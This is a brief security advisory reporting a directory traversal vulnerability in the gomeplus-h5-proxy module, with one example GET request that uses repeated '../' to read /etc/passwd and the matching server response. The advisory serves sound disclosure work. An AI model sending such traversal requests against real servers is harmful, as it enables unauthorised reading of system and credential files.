title: Directory Traversal
overview:
`gomeplus-h5-proxy` is vulnerable to a directory traversal issue, allowing attackers to access any file in the system by placing '../' in the URL.

Example request:
```
GET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
host: localhost
```
and response:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Date: Mon, 22 May 2017 21:29:51 GMT
Connection: keep-alive
Transfer-Encoding: chunked

{contents of /etc/passwd}
```
recommendation: Because there is no fix for this module, we suggest using a different one.
